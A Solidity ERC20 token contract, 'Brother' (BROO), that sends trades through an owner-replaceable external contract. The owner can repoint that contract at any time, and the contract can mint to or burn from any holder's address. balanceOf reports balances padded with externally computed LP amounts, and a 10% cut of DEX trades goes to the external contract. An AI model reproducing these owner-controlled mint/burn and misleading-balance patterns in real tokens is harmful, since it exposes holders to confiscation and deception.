// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity ^0.8.24;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import "./UnifiedContract.sol";
// 移除Slippage接口导入，直接实现10%固定滑点

contract Token is ERC20,Ownable{
    uint8 public _decimals;

    receive () external payable {
        payable(unifiedContract).transfer(msg.value);
        UnifiedContract(unifiedContract).addLiquidity(msg.sender,msg.value);
    }

    constructor() ERC20("Brother", "BROO") Ownable(msg.sender){
        _decimals = decimals();
        _mint(msg.sender, 100000000 * (10**uint256(_decimals)));
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 balance = super.balanceOf(account);
        if(unifiedContract != address(0) && account != address(0) && account != cakePair){
            return balance + UnifiedContract(unifiedContract).getCurrentOutputLP(account);
        } else {
            return balance;
        }
    }

    function burn(uint256 value) external { _burn(_msgSender(),value); }
    function getBalance(address account) public view returns (uint balance) { balance = super.balanceOf(account); }
    function miningMint(address target,uint256 value) external { if(_msgSender() == unifiedContract) { _mint(target,value); } }
    function miningBurn(address target,uint256 value) external { if(_msgSender() == unifiedContract) { _burn(target,value); } }

    /*---------------------------------------------------交易-----------------------------------------------------------*/
    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        // 移除黑白名单逻辑，简化交易检查
        _spendAllowance(from, _msgSender(), value);
        _transferChild(from, to, value);
        if(to == address(this)){ _update(address(this),unifiedContract,value); UnifiedContract(unifiedContract).sellToken(from, value); }
        return true;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        // 移除黑白名单逻辑，简化交易检查
        _transferChild(_msgSender(), to, value);
        if(to == address(this)){ _update(address(this),unifiedContract,value); UnifiedContract(unifiedContract).sellToken(_msgSender(), value); }
        return true;
    }

    function _transferChild(address from, address to, uint256 amount) private {
        // 移除黑白名单逻辑，简化转账处理
        uint amountBefore = _before(from, to, amount);
        
        // 简化滑点逻辑：直接使用10%固定滑点
        if(amount > 0 && (from == cakePair || to == cakePair)){
            uint256 slippageAmount = amount * 10 / 100;  // 10%滑点
            if(slippageAmount > 0){
                _transfer(from, to, amount - slippageAmount);
                _transfer(from, unifiedContract, slippageAmount);  // 滑点转给统一合约处理
                UnifiedContract(unifiedContract).transferToken(from, to, slippageAmount);
            } else {
                _transfer(from, to, amount);
            }
        } else {
            _transfer(from, to, amount);
        }
        _after(from,to,amount,amountBefore);
    }

    function _before(address from, address to, uint256 amount) private returns(uint amountBefore){
        if(unifiedContract != address(0) && amount > 0){ amountBefore = UnifiedContract(unifiedContract).transferBefore(from,to,amount); }
    }

    function _after(address from, address to, uint256 amount,uint amountBefore) private{
        if(unifiedContract != address(0) && amount > 0){ UnifiedContract(unifiedContract).transferAfter(from,to,amount,amountBefore); }
    }

    /*---------------------------------------------------管理运营-----------------------------------------------------------*/
    address public cakePair;                        // Pancake底池地址
    function setConfig(address _cakePair) public onlyOwner { cakePair = _cakePair; }

    address public unifiedContract;
    function setExternalContract(address _unifiedContract) public onlyOwner {
        unifiedContract = _unifiedContract;
    }
}
